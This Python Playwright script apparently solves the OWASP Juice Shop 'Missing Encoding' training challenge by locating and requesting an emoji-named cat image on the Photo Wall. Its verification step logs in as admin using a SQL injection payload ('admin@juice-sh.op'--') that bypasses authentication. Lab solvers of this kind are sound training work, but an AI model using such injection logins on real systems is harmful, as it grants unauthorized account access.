#!/usr/bin/env python3
"""
Solve Missing Encoding Challenge
Find Bjoern's cat photo in melee combat-mode on the Photo Wall
The image has an emoji in its filename that causes encoding issues
"""

from playwright.sync_api import sync_playwright
import time
import requests
import urllib.parse

TARGET = "http://66.42.93.220:3000"

def solve_missing_encoding():
    """Solve the Missing Encoding challenge"""
    
    print("🐱 SOLVING MISSING ENCODING CHALLENGE")
    print("=" * 60)
    print("Goal: Retrieve the photo of Bjoern's cat in 'melee combat-mode'")
    print("Hint: Check the Photo Wall for an image that could not be loaded correctly")
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)  # Show browser to see what happens
        page = browser.new_page()
        
        # Step 1: Navigate to the Photo Wall
        print("\n📍 Step 1: Navigating to Photo Wall...")
        page.goto(f"{TARGET}/#/photo-wall", wait_until="networkidle", timeout=30000)
        time.sleep(3)
        
        # Dismiss cookie consent if present
        try:
            cookie_btn = page.locator('a:has-text("Me want it")').first
            if cookie_btn.is_visible():
                cookie_btn.click()
                print("   ✅ Dismissed cookie consent")
                time.sleep(1)
        except:
            pass
        
        # Step 2: Find all images on the Photo Wall
        print("\n📍 Step 2: Finding images on Photo Wall...")
        
        # Look for all image elements
        images = page.locator('img').all()
        print(f"   Found {len(images)} images")
        
        broken_image_found = False
        emoji_image_url = None
        
        # Check each image
        for i, img in enumerate(images):
            try:
                src = img.get_attribute('src')
                alt = img.get_attribute('alt') or ''
                
                # Check if image failed to load (naturalWidth = 0)
                is_broken = page.evaluate(f'''
                    (function() {{
                        var imgs = document.querySelectorAll('img');
                        if (imgs[{i}]) {{
                            return imgs[{i}].naturalWidth === 0;
                        }}
                        return false;
                    }})()
                ''')
                
                if is_broken:
                    print(f"   ❌ Found broken image: {src}")
                    broken_image_found = True
                
                # Look for images with emoji or special characters in URL
                if src and ('%F0%9F' in src or 'emoji' in src.lower() or '#' in src):
                    print(f"   🎯 Found image with special encoding: {src}")
                    emoji_image_url = src
                    
                    # This is likely the cat image with emoji
                    if 'zatschi' in src or 'cat' in alt.lower() or 'melee' in alt.lower():
                        print(f"   🐱 This looks like Bjoern's cat!")
                        emoji_image_url = src
                        break
                        
            except Exception as e:
                pass
        
        # Step 3: Try to access the broken/emoji image directly
        print("\n📍 Step 3: Accessing the problematic image...")
        
        # The known emoji image URL based on previous attempts
        known_urls = [
            "/assets/public/images/uploads/%F0%9F%98%BC-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg",
            "/assets/public/images/uploads/😼-#zatschi-#whoneedsfourlegs-1572600969477.jpg",
            "/assets/public/images/uploads/😼-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg"
        ]
        
        for relative_url in known_urls:
            full_url = f"{TARGET}{relative_url}"
            print(f"\n   Trying: {full_url}")
            
            try:
                # Navigate directly to the image
                page.goto(full_url, wait_until="domcontentloaded", timeout=10000)
                time.sleep(2)
                
                # Check if we got an image response
                content_type = page.evaluate("document.contentType")
                print(f"   Content-Type: {content_type}")
                
                if 'image' in str(content_type).lower():
                    print("   ✅ Successfully accessed the cat image!")
                    
                    # Take a screenshot
                    page.screenshot(path="/Users/walterbarr_1/sql-injection-lab/cat_melee.png")
                    print("   📸 Screenshot saved: cat_melee.png")
                    break
                    
            except Exception as e:
                print(f"   Error: {e}")
        
        # Alternative: Click on the broken image on Photo Wall
        if broken_image_found or emoji_image_url:
            print("\n📍 Step 4: Clicking on the broken/special image...")
            page.goto(f"{TARGET}/#/photo-wall", wait_until="networkidle")
            time.sleep(2)
            
            # Find and click the image with emoji/special characters
            images = page.locator('img').all()
            for img in images:
                try:
                    src = img.get_attribute('src')
                    if src and ('%F0%9F' in src or '#' in src):
                        print(f"   Clicking on: {src}")
                        img.click()
                        time.sleep(2)
                        break
                except:
                    pass
        
        browser.close()
    
    # Step 5: Verify if challenge was solved
    print("\n📍 Step 5: Checking if challenge was solved...")
    
    session = requests.Session()
    
    # Login as admin
    login_resp = session.post(
        f"{TARGET}/rest/user/login",
        json={"email": "admin@juice-sh.op'--", "password": "x"}
    )
    
    if login_resp.status_code == 200:
        token = login_resp.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
    
    # Check challenge status
    resp = session.get(f"{TARGET}/api/Challenges/")
    if resp.status_code == 200:
        challenges = resp.json().get('data', [])
        
        missing_encoding = next((c for c in challenges if 'Missing Encoding' in c.get('name', '')), None)
        
        if missing_encoding:
            if missing_encoding.get('solved'):
                print("\n✅ SUCCESS! Missing Encoding challenge SOLVED!")
                print("   You found Bjoern's cat in melee combat-mode! 🐱⚔️")
                return True
            else:
                print("\n⚠️ Missing Encoding challenge not solved yet")
                print("\n💡 The challenge requires:")
                print("   1. Go to Photo Wall")
                print("   2. Find the image with emoji in filename (😼)")
                print("   3. Access or click on that specific image")
                print("   4. The image shows a cat with a #zatschi hashtag")
    
    return False

if __name__ == "__main__":
    solve_missing_encoding()